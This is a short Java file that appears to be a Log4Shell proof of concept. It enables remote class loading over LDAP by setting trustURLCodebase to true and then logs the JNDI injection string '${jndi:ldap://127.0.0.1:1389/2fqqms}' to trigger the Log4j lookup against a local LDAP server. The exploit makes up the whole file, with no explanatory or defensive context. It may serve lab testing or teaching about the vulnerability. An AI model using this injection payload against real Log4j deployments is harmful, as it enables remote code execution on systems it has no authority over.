import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Main {


    private static final Logger LOGGER = LogManager.getLogger(Main.class);

    public static void main(String[] args) {
        // remote class loading in LDAP.
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");
        LOGGER.error("${jndi:ldap://127.0.0.1:1389/2fqqms}");


    }
}
